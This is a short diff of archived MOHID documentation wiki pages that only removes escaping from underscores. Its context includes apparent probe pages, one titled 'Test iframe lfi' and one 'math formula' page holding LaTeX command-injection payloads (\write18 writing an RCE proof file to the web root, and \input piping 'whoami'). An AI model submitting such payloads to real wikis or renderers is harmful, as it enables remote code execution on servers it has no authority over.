@@ -64,7 +64,7 @@ This wiki code outputs the folowing:
 
 > **Archived page.** This content is kept for historical reference only. It may be out of date, incomplete or unrelated to the current MOHID documentation, and it is not maintained.
 
-[http://en.wikipedia.org/wiki/Finite\_volume\_method](http://en.wikipedia.org/wiki/Finite_volume_method)
+[http://en.wikipedia.org/wiki/Finite_volume_method](http://en.wikipedia.org/wiki/Finite_volume_method)
 
 ### Fine volume method
 
@@ -125,7 +125,7 @@ Time: 21:05
 
 > **Archived page.** This content is kept for historical reference only. It may be out of date, incomplete or unrelated to the current MOHID documentation, and it is not maintained.
 
-<html>**HTMLEXT\_ACTIVE**</html>
+<html>**HTMLEXT_ACTIVE**</html>
 
 ### Test iframe lfi
 
@@ -145,7 +145,7 @@ Time: 21:05
 
 Test page with math formulas:
 
-** \\write18{echo RCE > C:\\inetpub\\wwwroot\\wiki\\rce\_proof.txt}**
+** \\write18{echo RCE > C:\\inetpub\\wwwroot\\wiki\\rce_proof.txt}**
 
 ** \\input{|"whoami"}**
 
